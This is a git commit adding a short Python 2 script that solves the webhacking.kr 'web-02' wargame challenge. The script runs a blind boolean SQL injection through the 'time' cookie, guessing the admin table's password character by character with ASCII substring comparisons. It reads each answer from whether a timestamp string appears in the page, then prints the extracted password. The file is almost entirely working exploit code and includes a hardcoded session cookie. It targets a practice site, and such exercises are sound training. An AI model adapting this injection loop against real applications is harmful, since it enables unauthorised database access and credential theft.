db96f92419e1270c0bb8308787d97cdb78fa4bac
tarunkant <tarunkant05@gmail.com>
2017-02-21 19:33:19 +0530

    added a file

---
+++ web_hacking-2.1.py
@@ -0,0 +1,25 @@
+import requests
+import re
+
+
+url = 'http://webhacking.kr/challenge/web/web-02/index.php'
+
+cmp = "09:00:01"
+
+
+dbname= ""
+
+#Password is
+for i in range(1,11):
+    for j in range(40,125):
+        query = "1487676946 and (select  ascii(substr(password," + str(i) + ",1))=" + str(j) + " from admin)"
+        cookie = {'PHPSESSID': 'bd1ab4e28a5aaa3629bd9cf232d62759','time':query}
+        req = requests.get(url, cookies=cookie)
+        res=req.text
+        tmp = re.findall(cmp, res)
+        if tmp:
+            dbname += chr(j)
+            break
+        print str(j)
+print "Password is : " + dbname
+        
